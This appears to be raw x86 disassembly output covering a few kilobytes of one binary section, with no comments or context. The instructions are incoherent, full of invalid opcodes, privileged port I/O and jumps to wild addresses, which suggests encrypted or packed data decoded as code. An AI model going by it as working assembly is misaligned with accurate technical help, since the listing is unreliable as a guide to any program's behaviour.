  41f479:	xor    eax,0x7cb10a1e
  41f47e:	push   ecx
  41f47f:	and    BYTE PTR [edi-0x74eb5dc2],al
  41f485:	call   0x9d689d4a
  41f48a:	cmp    bh,BYTE PTR ds:0xe4366c8f
  41f490:	add    BYTE PTR [ebp+0x2a],cl
  41f493:	adc    eax,0x24b47075
  41f498:	stos   DWORD PTR es:[edi],eax
  41f499:	mov    al,0x9c
  41f49b:	inc    ebp
  41f49c:	cmc    
  41f49d:	xor    dh,BYTE PTR [edx+0x25693c87]
  41f4a3:	inc    ebx
  41f4a4:	or     ecx,ecx
  41f4a6:	jns    0x41f516
  41f4a8:	adc    al,0x3c
  41f4aa:	push   eax
  41f4ab:	cmp    esi,edi
  41f4ad:	sti    
  41f4ae:	ins    BYTE PTR es:[edi],dx
  41f4af:	mov    WORD PTR [eax-0x4f],fs
  41f4b2:	or     edi,DWORD PTR [esi-0x61d4c097]
  41f4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4b9:	addr16 jl 0x41f527
  41f4bc:	dec    esi
  41f4bd:	ret    0xc3ca
  41f4c0:	iret   
  41f4c1:	inc    ebx
  41f4c2:	repz or DWORD PTR [ebx-0x2bb85da7],ecx
  41f4c9:	xor    edx,DWORD PTR [ecx-0x4ec904b2]
  41f4cf:	int    0x6e
  41f4d1:	stos   BYTE PTR es:[edi],al
  41f4d2:	mov    ebp,0xe756a14
  41f4d7:	test   eax,0x42b11e9e
  41f4dc:	and    BYTE PTR [ebx+ebx*4],0xa6
  41f4e0:	pop    ebp
  41f4e1:	push   ss
  41f4e2:	out    0x6f,eax
  41f4e4:	sahf   
  41f4e5:	jbe    0x41f4ce
  41f4e7:	add    eax,0xedbbe105
  41f4ec:	sbb    BYTE PTR [edi],cl
  41f4ee:	cmp    DWORD PTR [edi+0x6089b352],0xffffffbe
  41f4f5:	(bad)  
  41f4f6:	out    0xbd,eax
  41f4f8:	adc    BYTE PTR [ebx-0x50d9263d],0xb5
  41f4ff:	mov    DWORD PTR [ecx],ebp
  41f501:	sahf   
  41f502:	std    
  41f503:	imul   ecx,DWORD PTR [eax],0x16
  41f506:	pop    esp
  41f507:	lods   al,BYTE PTR fs:[esi]
  41f509:	mov    eax,0xae292b66
  41f50e:	mov    ecx,DWORD PTR [ebx+0xd]
  41f511:	mov    cs,ecx
  41f513:	or     BYTE PTR [esi+0x5],ah
  41f516:	scas   eax,DWORD PTR es:[edi]
  41f517:	mov    ch,0x32
  41f519:	xlat   BYTE PTR ds:[ebx]
  41f51a:	aaa    
  41f51b:	test   DWORD PTR [eax],0xa2087816
  41f521:	mov    eax,ds:0x23e59204
  41f526:	hlt    
  41f527:	lods   al,BYTE PTR ds:[esi]
  41f528:	fstp   QWORD PTR [esi+edx*8-0x38b49359]
  41f52f:	in     eax,0x17
  41f531:	fwait
  41f532:	stc    
  41f533:	dec    edi
  41f534:	pop    edi
  41f535:	xchg   edi,eax
  41f536:	ret    
  41f537:	test   eax,0x682a1aae
  41f53c:	mov    fs,WORD PTR ds:0x6e7bd89
  41f542:	sbb    dl,dl
  41f544:	sub    DWORD PTR [eax+0x1b],0xe570e0f5
  41f54b:	out    0x5b,eax
  41f54d:	push   esi
  41f54e:	inc    ebp
  41f54f:	loope  0x41f51f
  41f551:	lahf   
  41f552:	add    BYTE PTR [esi-0x18],ch
  41f555:	sbb    ebx,edi
  41f557:	jae    0x41f503
  41f559:	or     BYTE PTR [ecx],bh
  41f55b:	push   edx
  41f55c:	scas   al,BYTE PTR es:[edi]
  41f55d:	mov    eax,ds:0xd9bc6259
  41f562:	jb     0x41f55e
  41f564:	in     al,dx
  41f565:	fdivr  DWORD PTR [edx-0x75]
  41f568:	arpl   si,bx
  41f56a:	pop    esi
  41f56b:	shr    dh,0xe7
  41f56e:	and    eax,0x11639bb4
  41f573:	lahf   
  41f574:	jb     0x41f521
  41f576:	retf   
  41f577:	adc    al,0xc5
  41f579:	repnz mov bl,0x36
  41f57c:	arpl   WORD PTR es:[edi],bx
  41f57f:	jbe    0x41f52d
  41f581:	xchg   edi,eax
  41f582:	ficomp DWORD PTR [ebx+0x3d]
  41f585:	scas   al,BYTE PTR es:[edi]
  41f586:	mov    WORD PTR [esi-0x4c],gs
  41f589:	in     al,dx
  41f58a:	aas    
  41f58b:	sbb    DWORD PTR [ebx+0x57],ebx
  41f58e:	bound  edx,QWORD PTR [ecx+edi*2+0xc30a4d2]
  41f595:	mov    esp,0xca809015
  41f59a:	or     al,0x70
  41f59c:	js     0x41f586
  41f59e:	pop    edx
  41f59f:	test   DWORD PTR [edx-0xb],0x9975c3aa
  41f5a6:	sbb    eax,edi
  41f5a8:	push   ebp
  41f5a9:	and    edi,DWORD PTR ds:[esi-0x83f2a6e]
  41f5b0:	sub    ebx,DWORD PTR [edi-0x80]
  41f5b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5b4:	push   fs
  41f5b6:	lock push ebx
  41f5b8:	imul   eax
  41f5ba:	sub    BYTE PTR [ebx+0x4f],0x49
  41f5be:	xchg   edx,eax
  41f5bf:	cmp    BYTE PTR [ebx+0x78b627f2],0x1d
  41f5c6:	lea    ecx,[edx-0x7d]
  41f5c9:	cmp    eax,0x857d622f
  41f5ce:	ss push ss
  41f5d0:	add    eax,0x7926f1d3
  41f5d5:	pop    edx
  41f5d6:	dec    eax
  41f5d7:	into   
  41f5d8:	cld    
  41f5d9:	loopne 0x41f579
  41f5db:	xor    ch,BYTE PTR [eax-0x32]
  41f5de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5df:	dec    ecx
  41f5e0:	mov    ah,0x9c
  41f5e2:	aad    0xa3
  41f5e4:	ins    DWORD PTR es:[di],dx
  41f5e6:	das    
  41f5e7:	pop    esp
  41f5e8:	outs   dx,BYTE PTR ds:[esi]
  41f5e9:	int3   
  41f5ea:	sub    eax,0x6dc2b34f
  41f5ef:	call   0x4264:0xdb7b65e8
  41f5f6:	repnz loop 0x41f5cd
  41f5f9:	loopne 0x41f655
  41f5fb:	pushf  
  41f5fc:	test   BYTE PTR [edx+ebp*1+0x5d],dl
  41f600:	ins    BYTE PTR es:[edi],dx
  41f601:	js     0x41f65a
  41f603:	sti    
  41f604:	mov    bl,0xb9
  41f606:	test   DWORD PTR [esi],ebp
  41f608:	fadd   QWORD PTR [edx+0x0]
  41f60b:	and    al,0xbb
  41f60d:	cmp    cl,ah
  41f60f:	or     al,0xd6
  41f611:	add    eax,0xbcdb6d06
  41f616:	dec    esi
  41f617:	dec    esp
  41f618:	pop    ss
  41f619:	jp     0x41f66c
  41f61b:	fmulp  st(4),st
  41f61d:	imul   BYTE PTR [edi]
  41f61f:	dec    ebp
  41f620:	sub    eax,0x7919b593
  41f625:	aaa    
  41f626:	dec    esp
  41f627:	(bad)  
  41f628:	mov    esi,0xebf8f505
  41f62d:	(bad)  
  41f62e:	or     eax,0xcdcd37a2
  41f633:	jmp    FWORD PTR ds:0x8db03554
  41f639:	xor    dl,dl
  41f63b:	sbb    BYTE PTR [ebx-0x6e566dee],ah
  41f641:	aam    0x78
  41f643:	das    
  41f644:	dec    eax
  41f645:	inc    ebp
  41f646:	ins    BYTE PTR es:[edi],dx
  41f647:	pop    ebx
  41f648:	(bad)
  41f64c:	shr    edi,0x23
  41f64f:	mov    es,WORD PTR [edi+eiz*4]
  41f652:	int    0xea
  41f654:	and    esi,ecx
  41f656:	mov    ebx,0xee11ca5a
  41f65b:	sbb    edx,DWORD PTR [esp+esi*2+0x3d]
  41f65f:	popa   
  41f660:	dec    edi
  41f661:	and    ebp,ebx
  41f663:	mov    cl,0x9c
  41f665:	xchg   ecx,eax
  41f666:	in     al,0x39
  41f668:	cli    
  41f669:	or     al,0xc6
  41f66b:	les    ebp,FWORD PTR [edi-0x702706d2]
  41f671:	js     0x41f6ec
  41f673:	jp     0x41f654
  41f675:	jle    0x41f60e
  41f677:	jl     0x41f6ed
  41f679:	imul   esp,DWORD PTR [ecx-0x17],0xffffff8a
  41f67d:	stos   DWORD PTR es:[edi],eax
  41f67e:	sti    
  41f67f:	push   0x1e
  41f681:	mov    cl,BYTE PTR [esi]
  41f683:	jg     0x41f6f7
  41f685:	arpl   dx,bx
  41f687:	xchg   BYTE PTR [ecx-0x42],ah
  41f68a:	cmp    al,BYTE PTR [ecx]
  41f68c:	dec    ebx
  41f68d:	imul   esi,DWORD PTR [ebx+0x341e64e1],0x9f470532
  41f697:	sbb    al,0xaa
  41f699:	(bad)  
  41f69a:	enter  0xd523,0x44
  41f69e:	lahf   
  41f69f:	cmc    
  41f6a0:	(bad)  
  41f6a1:	fcomp  QWORD PTR [edx+0x6f]
  41f6a4:	mul    eax
  41f6a6:	clc    
  41f6a7:	ins    DWORD PTR es:[edi],dx
  41f6a8:	(bad)  
  41f6a9:	jmp    0xd740f696
  41f6ae:	dec    eax
  41f6af:	lods   eax,DWORD PTR ds:[esi]
  41f6b0:	jle    0x41f731
  41f6b2:	adc    eax,0x5f4d3916
  41f6b7:	call   0x22c7:0xb4fb0536
  41f6be:	sbb    DWORD PTR [ebp+ebx*1+0x1a],0x4e
  41f6c3:	jnp    0x41f73d
  41f6c5:	xchg   ecx,eax
  41f6c6:	fst    DWORD PTR [ecx+0x30]
  41f6c9:	mov    eax,0x260dd06d
  41f6ce:	xor    edx,ebx
  41f6d0:	shl    esp,1
  41f6d2:	aaa    
  41f6d3:	ss (bad) 
  41f6d5:	sub    eax,0x394caa1b
  41f6da:	adc    DWORD PTR [eax+0x2],eax
  41f6dd:	mov    al,ds:0x581450d
  41f6e2:	js     0x41f665
  41f6e4:	stos   DWORD PTR es:[edi],eax
  41f6e5:	or     eax,0x115502f3
  41f6ea:	fisttp WORD PTR [edx+ecx*2-0xe046837]
  41f6f1:	test   BYTE PTR [ecx],ah
  41f6f3:	les    ecx,FWORD PTR [eax+0x2b415cfa]
  41f6f9:	adc    eax,0x99672af5
  41f6fe:	pushf  
  41f6ff:	dec    edx
  41f700:	(bad)  
  41f701:	sti    
  41f702:	in     al,0xa6
  41f704:	fstp   DWORD PTR [ecx+0x5d25e78a]
  41f70a:	ror    BYTE PTR [edi+edx*8-0xa85d6ff],1
  41f711:	mov    bh,BYTE PTR [ecx]
  41f713:	pop    ebp
  41f714:	(bad)  
  41f715:	ficom  DWORD PTR [ecx]
  41f717:	pop    ss
  41f718:	es dec eax
  41f71a:	or     eax,0x633bf23b
  41f71f:	in     eax,dx
  41f720:	mov    esp,0x6816779f
  41f725:	lods   eax,DWORD PTR ds:[esi]
  41f726:	xchg   ecx,eax
  41f727:	ficomp WORD PTR [ebp+edi*1+0x6e2a3c9]
  41f72e:	repz (bad) 
  41f730:	inc    edx
  41f731:	rcr    BYTE PTR ds:0x72b02165,1
  41f737:	not    ebx
  41f739:	jle    0x41f774
  41f73b:	pop    ebp
  41f73c:	pop    ecx
  41f73d:	lds    eax,FWORD PTR [ebx-0x58631ff8]
  41f743:	xor    BYTE PTR [ebx-0x6c87d65f],cl
  41f749:	in     eax,dx
  41f74a:	ja     0x41f760
  41f74c:	adc    eax,0x57b58ce5
  41f751:	out    0x21,al
  41f753:	adc    al,0x22
  41f755:	stc    
  41f756:	aad    0xfc
  41f758:	cld    
  41f759:	jg     0x41f6e8
  41f75b:	and    eax,0xfabbe78a
  41f760:	sub    esp,DWORD PTR [ebp-0x643d739f]
  41f766:	aam    0x39
  41f768:	scas   al,BYTE PTR es:[edi]
  41f769:	sub    BYTE PTR [edx+0x4c0e6867],al
  41f76f:	add    bh,BYTE PTR [edi-0x57fbcc81]
  41f775:	fidivr DWORD PTR [edi+eiz*1+0x64ea9b2d]
  41f77c:	pop    ebx
  41f77d:	sbb    DWORD PTR [ebp-0x627750cf],0xea2b45bd
  41f787:	adc    BYTE PTR [edx+0x33],ch
  41f78a:	and    BYTE PTR [ebp+0x26ae8df5],cl
  41f790:	inc    edi
  41f791:	outs   dx,BYTE PTR ds:[esi]
  41f792:	xor    DWORD PTR [edi+0x2e],ecx
  41f795:	push   es
  41f796:	daa    
  41f797:	dec    eax
  41f798:	jnp    0x41f7df
  41f79a:	pop    edx
  41f79b:	imul   edx,ebx,0x1750129a
  41f7a1:	and    DWORD PTR [eax-0x78],edx
  41f7a4:	dec    esp
  41f7a5:	call   0x7a8:0xd8645045
  41f7ac:	sbb    eax,ecx
  41f7ae:	mov    al,ds:0xce822cbf
  41f7b3:	mov    edx,0x378e1c01
  41f7b8:	push   eax
  41f7b9:	adc    ecx,DWORD PTR [ebx+ebx*8]
  41f7bc:	cmp    eax,0x9fb25f55
  41f7c1:	out    0x4,al
  41f7c3:	pop    eax
  41f7c4:	jmp    0x637c7a87
  41f7c9:	sub    al,0x17
  41f7cb:	gs ret 0xb736
  41f7cf:	xchg   ecx,eax
  41f7d0:	lahf   
  41f7d1:	inc    ebp
  41f7d2:	xchg   BYTE PTR [eax+0x1b],dh
  41f7d5:	jmp    0x41f818
  41f7d7:	ret    0x3392
  41f7da:	stc    
  41f7db:	adc    ebx,DWORD PTR [esi]
  41f7dd:	(bad)  
  41f7de:	enter  0xa85d,0xac
  41f7e2:	dec    edx
  41f7e3:	lods   ax,WORD PTR ds:[esi]
  41f7e5:	femms  
  41f7e7:	leave  
  41f7e8:	xor    eax,0x78533d85
  41f7ed:	xor    al,0xc7
  41f7ef:	push   ebx
  41f7f0:	sub    al,0xa5
  41f7f2:	mov    ss,WORD PTR [esi*4-0x7ce64bbc]
  41f7f9:	js     0x41f793
  41f7fb:	push   ecx
  41f7fc:	pop    esp
  41f7fd:	cmp    edi,0xffffffc0
  41f800:	nop
  41f801:	mov    ah,BYTE PTR [edx-0x5d]
  41f804:	mov    ebp,0x3e439a59
  41f809:	daa    
  41f80a:	sub    BYTE PTR [esi-0x59],dl
  41f80d:	mov    ds:0xdf00cd22,eax
  41f812:	pop    ss
  41f813:	fisttp QWORD PTR ds:0x9d81197e
  41f819:	and    al,0xc6
  41f81b:	mov    ch,0xf3
  41f81d:	jbe    0x41f7ff
  41f81f:	repnz xchg ecx,eax
  41f821:	mov    esp,0xca9fcbab
  41f826:	xchg   esp,esi
  41f828:	mov    esp,0x61a66520
  41f82d:	push   ecx
  41f82e:	xchg   esp,eax
  41f82f:	addr16 push ss
  41f831:	pushf  
  41f832:	jnp    0x41f86e
  41f834:	xor    bl,BYTE PTR [ebp-0xb]
  41f837:	and    al,0xcc
  41f839:	int3   
  41f83a:	lds    edx,FWORD PTR [ebp-0x54]
  41f83d:	and    dh,BYTE PTR [ecx+ecx*4]
  41f840:	push   eax
  41f841:	icebp  
  41f842:	rol    BYTE PTR [ebx-0x2],0x7a
  41f846:	fs nop
  41f848:	sbb    al,0x9f
  41f84a:	xlat   BYTE PTR ds:[ebx]
  41f84b:	inc    esp
  41f84c:	xchg   BYTE PTR [ecx],dh
  41f84e:	rol    DWORD PTR [ebx+0x25],cl
  41f851:	add    ebx,DWORD PTR [esi+0x1fd4e683]
  41f857:	push   edx
  41f858:	(bad)
  41f85b:	shr    DWORD PTR [edi+0x42],1
  41f85e:	dec    edi
  41f85f:	aas    
  41f860:	xchg   BYTE PTR [eax+0x3a],ah
  41f863:	jp     0x41f867
  41f865:	out    dx,al
  41f866:	push   ecx
  41f867:	arpl   WORD PTR [edi],si
  41f869:	fs sbb al,0x8b
  41f86c:	pop    esp
  41f86d:	jo     0x41f878
  41f86f:	xor    BYTE PTR [esi-0x26],0x21
  41f873:	add    al,0x17
  41f875:	ss xchg esi,eax
  41f877:	jbe    0x41f86f
  41f879:	dec    ecx
  41f87a:	inc    edx
  41f87b:	cs dec edi
  41f87d:	jmp    0x7610dad5
  41f882:	xchg   DWORD PTR [ebx+ebp*2-0x5],esi
  41f886:	pop    es
  41f887:	aam    0xc9
  41f889:	sbb    ch,BYTE PTR [edi]
  41f88b:	mov    esp,0x1d8bc290
  41f890:	popf   
  41f891:	scas   eax,DWORD PTR es:[edi]
  41f892:	int    0x43
  41f894:	dec    eax
  41f895:	xchg   edx,eax
  41f896:	and    DWORD PTR [eax],0xd87cace4
  41f89c:	aam    0xc9
  41f89e:	(bad)  
  41f8a2:	pushf  
  41f8a3:	sub    BYTE PTR [edx+0x5a],0x71
  41f8a7:	add    BYTE PTR [edi-0x38],cl
  41f8aa:	add    ebx,esi
  41f8ac:	ja     0x41f869
  41f8ae:	jg     0x41f91e
  41f8b0:	ss jg  0x41f871
  41f8b3:	sbb    al,0x23
  41f8b5:	xchg   BYTE PTR [esi],dh
  41f8b7:	xchg   ecx,eax
  41f8b8:	mov    ebp,0xe97be540
  41f8bd:	cmc    
  41f8be:	repnz mov bh,0xbe
  41f8c1:	aam    0x72
  41f8c3:	clc    
  41f8c4:	mov    ds:0x3d5d0f27,al
  41f8c9:	sbb    bl,BYTE PTR [edx-0x4195eb6f]
  41f8cf:	int    0x2a
  41f8d1:	adc    eax,0xc37c9dfb
  41f8d6:	and    ch,ch
  41f8d8:	cmc    
  41f8d9:	inc    edx
  41f8da:	not    edi
  41f8dc:	clc    
  41f8dd:	out    0xe8,al
  41f8df:	dec    ebx
  41f8e0:	inc    esp
  41f8e1:	popf   
  41f8e2:	mov    edi,?
  41f8e4:	xchg   edx,eax
  41f8e5:	xor    ecx,DWORD PTR [edi+0x1e]
  41f8e8:	mov    ah,0x8c
  41f8ea:	fadd   st,st(0)
  41f8ec:	adc    ch,ah
  41f8ee:	data16 loope 0x41f915
  41f8f1:	fidivr DWORD PTR [ecx]
  41f8f3:	mov    bl,0xa
  41f8f5:	ret    0xf296
  41f8f8:	push   eax
  41f8f9:	jns    0x41f8b8
  41f8fb:	sbb    DWORD PTR [edx+0x7bca137b],edx
  41f901:	leave  
  41f902:	pop    esi
  41f903:	pop    edx
  41f904:	cs mov ds:0x5e309eab,al
  41f90b:	jmp    0x41f914
  41f90d:	push   ebp
  41f90e:	lods   al,BYTE PTR ds:[esi]
  41f90f:	add    BYTE PTR [edx],0x73
  41f912:	out    dx,eax
  41f913:	jg     0x41f92c
  41f915:	in     eax,dx
  41f916:	mov    ecx,0x4b13dbf0
  41f91b:	hlt    
  41f91c:	push   ss
  41f91d:	mov    ch,0x6a
  41f91f:	cmp    DWORD PTR [edi],edi
  41f921:	sti    
  41f922:	sbb    DWORD PTR [eax],ebp
  41f924:	jae    0x41f913
  41f926:	push   0x441cc690
  41f92b:	sub    DWORD PTR [ecx+0x5f8588ff],ecx
  41f931:	sbb    DWORD PTR ss:[edi-0x45cb891c],esp
  41f938:	ja     0x41f92a
  41f93a:	mov    ebp,DWORD PTR [ebx+0x34]
  41f93d:	rcl    BYTE PTR [edi-0x4b],0x8d
  41f941:	ins    BYTE PTR es:[edi],dx
  41f942:	cmp    ecx,DWORD PTR [ecx-0x68f0268b]
  41f948:	push   es
  41f949:	mov    ecx,edi
  41f94b:	xchg   DWORD PTR [edi+0x5ccba96b],eax
  41f951:	sbb    eax,0x6b85c837
  41f956:	icebp  
  41f957:	push   esp
  41f958:	aaa    
  41f959:	lahf   
  41f95a:	lods   al,BYTE PTR ds:[esi]
  41f95b:	jae    0x41f971
  41f95d:	pop    esi
  41f95e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f95f:	sti    
  41f960:	leave  
  41f961:	dec    esi
  41f963:	jmp    0x41f939
  41f965:	lds    esp,FWORD PTR [edi+0x5e8404a4]
  41f96b:	aas    
  41f96c:	xor    eax,0x99fbfcfc
  41f971:	fdivp  st(3),st
  41f973:	dec    eax
  41f974:	jmp    0x2c69:0x331e8ab9
  41f97b:	mov    esp,0x425a1b7e
  41f980:	pushf  
  41f981:	clc    
  41f982:	ins    BYTE PTR es:[edi],dx
  41f983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f984:	dec    ebx
  41f985:	jnp    0x41f9d5
  41f987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f988:	outs   dx,BYTE PTR ds:[esi]
  41f989:	popf   
  41f98a:	sbb    DWORD PTR [edi+0x2aed032e],0xa3bda292
  41f994:	mov    ebx,0x472f299f
  41f999:	mov    al,0x86
  41f99b:	(bad)  
  41f99c:	adc    al,0x90
  41f99e:	imul   ebx,esi,0xffffffbd
  41f9a1:	inc    ebx
  41f9a2:	xchg   BYTE PTR [edi],cl
  41f9a4:	dec    edi
  41f9a5:	js     0x41f998
  41f9a7:	dec    BYTE PTR [edi]
  41f9a9:	(bad)  
  41f9aa:	popf   
  41f9ab:	mov    ebp,0x7fd9718
  41f9b0:	jnp    0x41f97a
  41f9b2:	push   edi
  41f9b3:	xchg   edx,eax
  41f9b4:	test   dl,0x72
  41f9b7:	and    eax,0x994f9910
  41f9bc:	push   ss
  41f9bd:	out    0x53,al
  41f9bf:	xor    eax,0x2c61863d
  41f9c4:	mov    dh,0x9f
  41f9c6:	jns    0x41f9ea
  41f9c8:	repz pop ebx
  41f9ca:	sbb    ebx,DWORD PTR [esi+0x71]
  41f9cd:	add    ebp,0x5e
  41f9d0:	pop    edi
  41f9d1:	sub    bl,BYTE PTR [ecx+0x43d8f36f]
  41f9d7:	or     al,0x90
  41f9d9:	int3   
  41f9da:	sub    cl,BYTE PTR [esi+eax*2]
  41f9dd:	int3   
  41f9de:	xchg   edx,eax
  41f9df:	cwde   
  41f9e0:	aaa    
  41f9e1:	xor    cl,BYTE PTR [esi]
  41f9e3:	mov    edx,0x18758e9
  41f9e8:	addr16 mov ebp,0x274cee7d
  41f9ee:	sub    DWORD PTR [ebx+0x63],esp
  41f9f1:	inc    esp
  41f9f2:	mov    cl,0xa8
  41f9f4:	arpl   WORD PTR [ecx+0x33d297ce],bx
  41f9fa:	enter  0xc182,0xe4
  41f9fe:	lods   eax,DWORD PTR ds:[esi]
  41f9ff:	scas   al,BYTE PTR es:[edi]
  41fa00:	nop
  41fa01:	or     BYTE PTR [ecx-0x3e],ch
  41fa04:	test   BYTE PTR [edx+0x494fbabf],bl
  41fa0a:	cmp    al,0x4
  41fa0c:	loope  0x41f991
  41fa0e:	xlat   BYTE PTR ds:[ebx]
  41fa0f:	adc    DWORD PTR [edi],ebp
  41fa11:	jl     0x41f9ae
  41fa13:	push   edx
  41fa14:	popa   
  41fa15:	pop    ds
  41fa16:	jmp    0x41f9ce
  41fa18:	retf   
  41fa19:	jl     0x41f9b0
  41fa1b:	push   ds
  41fa1c:	repz or al,0x97
  41fa1f:	imul   esi,DWORD PTR [ebp+eax*4-0x5a],0xbc29fb13
  41fa27:	imul   ebp,DWORD PTR [edx],0xffffffcc
  41fa2a:	outs   dx,DWORD PTR ds:[esi]
  41fa2b:	adc    DWORD PTR [ecx],esi
  41fa2d:	jle    0x41fa50
  41fa2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa30:	mov    dh,0x3a
  41fa32:	jmp    0xd82:0xff0c86e4
  41fa39:	mov    edi,edi
  41fa3b:	mov    edi,0xa03a7c71
  41fa40:	fsubrp st(2),st
  41fa42:	jno    0x41fa12
  41fa44:	mov    bl,0x9a
  41fa46:	aam    0x9e
  41fa48:	inc    esi
  41fa49:	std    
  41fa4a:	push   edi
  41fa4b:	dec    eax
  41fa4c:	sahf   
  41fa4d:	pop    esp
  41fa4e:	adc    ch,ch
  41fa50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa51:	and    esi,ebx
  41fa53:	(bad)  
  41fa54:	sub    bl,al
  41fa56:	repnz outs dx,DWORD PTR es:[esi]
  41fa59:	pop    ds
  41fa5a:	add    eax,0x15272699
  41fa5f:	mov    edx,0x9ca7888b
  41fa64:	inc    eax
  41fa65:	lahf   
  41fa66:	cmp    DWORD PTR [ebx-0x3a],edi
  41fa69:	xchg   edi,eax
  41fa6a:	jns    0x41fa3d
  41fa6c:	push   edi
  41fa6d:	push   esp
  41fa6e:	jns    0x41fa72
  41fa70:	mov    edi,0xe57f525
  41fa75:	jle    0x41faa9
  41fa77:	cmp    cl,cl
  41fa79:	ret    0x120a
  41fa7c:	hlt    
  41fa7d:	xor    al,BYTE PTR [ebp+ebp*1-0x37]
  41fa81:	retf   
  41fa82:	not    DWORD PTR [ecx]
  41fa84:	cmp    esp,DWORD PTR [ebx]
  41fa86:	jl     0x41fac2
  41fa88:	sahf   
  41fa89:	mov    bl,0xf3
  41fa8b:	cmp    BYTE PTR [esi],bh
  41fa8d:	cmp    al,0x31
  41fa8f:	lahf   
  41fa90:	push   ebp
  41fa91:	lahf   
  41fa92:	lock repz xchg ebp,eax
  41fa95:	jb     0x41fa8c
  41fa97:	jnp    0x41fa26
  41fa99:	sub    al,0xa6
  41fa9b:	out    dx,eax
  41fa9c:	inc    edi
  41fa9d:	in     eax,dx
  41fa9e:	lods   eax,DWORD PTR ds:[esi]
  41fa9f:	mov    ds,edx
  41faa1:	jl     0x41fac8
  41faa3:	data16 add ch,al
  41faa6:	xchg   BYTE PTR [eax+0x26],dl
  41faa9:	xchg   ebx,eax
  41faaa:	cs test al,0x45
  41faad:	jg     0x41fa50
  41faaf:	xchg   DWORD PTR [edi],esi
  41fab1:	hlt    
  41fab2:	push   edi
  41fab3:	jno    0x41fa86
  41fab5:	test   BYTE PTR [ecx-0x362dc5d8],dh
  41fabb:	jo     0x41fa62
  41fabd:	push   0x67bb6257
  41fac2:	adc    ebx,DWORD PTR [ebx-0x5bdf7080]
  41fac8:	je     0x41fadf
  41faca:	pop    edx
  41facb:	or     DWORD PTR [edi-0x1451354e],ecx
  41fad1:	push   esp
  41fad2:	cmp    eax,0xd409815c
  41fad7:	cmc    
  41fad8:	icebp  
  41fad9:	mov    dh,BYTE PTR [edx+0x135a852e]
  41fadf:	int3   
  41fae0:	xor    al,dl
  41fae2:	adc    edi,DWORD PTR [eax+0x4eb9dc3c]
  41fae8:	int3   
  41fae9:	push   esi
  41faea:	fwait
  41faeb:	cmp    DWORD PTR [eax+0x90b9328],ecx
  41faf1:	(bad)  
  41faf2:	dec    eax
  41faf3:	sub    ebx,DWORD PTR [ecx+0x2a]
  41faf6:	mov    ds:0xc77bed70,eax
  41fafb:	dec    esp
  41fafc:	dec    edi
  41fafd:	mov    ah,0x5f
  41faff:	mov    bh,0x20
  41fb01:	bound  esp,QWORD PTR [esi]
  41fb03:	aas    
  41fb04:	mov    BYTE PTR [edx],ch
  41fb06:	shl    DWORD PTR [edx],cl
  41fb08:	jmp    0xc69a1440
  41fb0d:	jbe    0x41fb77
  41fb0f:	pop    edi
  41fb10:	xchg   edi,eax
  41fb11:	adc    BYTE PTR [ecx+0x0],0xdc
  41fb15:	dec    ebp
  41fb16:	dec    edx
  41fb17:	in     eax,dx
  41fb18:	cli    
  41fb19:	int    0xd3
  41fb1b:	pop    edx
  41fb1c:	xchg   ebp,eax
  41fb1d:	mov    WORD PTR [esi+0x26],?
  41fb20:	mov    ch,0x38
  41fb22:	push   0x75
  41fb24:	stc    
  41fb25:	sub    DWORD PTR [ebx-0x7b246f6a],ebp
  41fb2b:	(bad)  
  41fb2c:	retf   
  41fb2d:	pop    ds
  41fb2e:	ret    0x8a63
  41fb31:	xchg   ebp,eax
  41fb32:	mov    esi,DWORD PTR [esi+0x6a]
  41fb35:	sub    bl,BYTE PTR [esi-0x24b926e2]
  41fb3b:	popf   
  41fb3c:	cdq    
  41fb3d:	pushf  
  41fb3e:	xor    DWORD PTR [esi-0x7cb6a03],esi
  41fb44:	fs xchg ebp,eax
  41fb46:	popf   
  41fb47:	addr16 inc ebx
  41fb49:	and    al,0x41
  41fb4b:	dec    edi
  41fb4c:	jno    0x41fb34
  41fb4e:	jno    0x41fbb7
  41fb50:	mov    esp,0xf7479e83
  41fb55:	sbb    ebp,DWORD PTR ds:0xd5356e94
  41fb5b:	ins    DWORD PTR es:[edi],dx
  41fb5c:	or     DWORD PTR [eax-0x61],edi
  41fb5f:	inc    edi
  41fb60:	and    al,0x21
  41fb62:	dec    edx
  41fb63:	pop    edi
  41fb64:	jle    0x41fb12
  41fb66:	jmp    0x41fbd0
  41fb68:	xchg   esi,eax
  41fb69:	inc    BYTE PTR [esi+0x3a]
  41fb6c:	imul   esp,DWORD PTR [ecx+0x5d],0x4d
  41fb70:	shl    ecx,0x4e
  41fb73:	fdivr  st,st(7)
  41fb75:	jae    0x41fb5b
  41fb77:	add    DWORD PTR [eax+eiz*2-0x4a3ef1a2],0xffffff8e
  41fb7f:	push   edx
  41fb80:	mov    edx,0x6d40ee64
  41fb85:	into   
  41fb86:	retf   
  41fb87:	and    eax,0x1527bbe1
  41fb8c:	and    eax,0xaf42de68
  41fb91:	imul   eax,DWORD PTR [esi-0x2],0xb8fe0b23
  41fb98:	push   edx
  41fb99:	add    al,0xf3
  41fb9b:	inc    esi
  41fb9c:	scas   eax,DWORD PTR es:[edi]
  41fb9d:	add    al,0x35
  41fb9f:	inc    ebp
  41fba0:	push   0xacd3d16e
  41fba5:	pop    ebp
  41fba6:	mov    al,0x3b
  41fba8:	aas    
  41fba9:	fisttp QWORD PTR [ecx-0x29a6bba4]
  41fbaf:	gs dec ebx
  41fbb1:	push   0x2
  41fbb3:	into   
  41fbb4:	xor    ebp,eax
  41fbb6:	icebp  
  41fbb7:	xor    dl,BYTE PTR [eax+0x24]
  41fbba:	rol    DWORD PTR [edi-0x29],cl
  41fbbd:	xchg   esi,eax
  41fbbe:	or     al,0x8a
  41fbc0:	(bad)  
  41fbc1:	sti    
  41fbc2:	xchg   esp,eax
  41fbc3:	and    al,0x33
  41fbc5:	jnp    0x41fbd8
  41fbc7:	jmp    0x198096cc
  41fbcc:	inc    esp
  41fbcd:	cld    
  41fbce:	iret   
  41fbcf:	jno    0x41fbea
  41fbd1:	dec    ebx
  41fbd2:	pop    esp
  41fbd3:	cwde   
  41fbd4:	push   ebp
  41fbd5:	sub    eax,0x79319aee
  41fbda:	std    
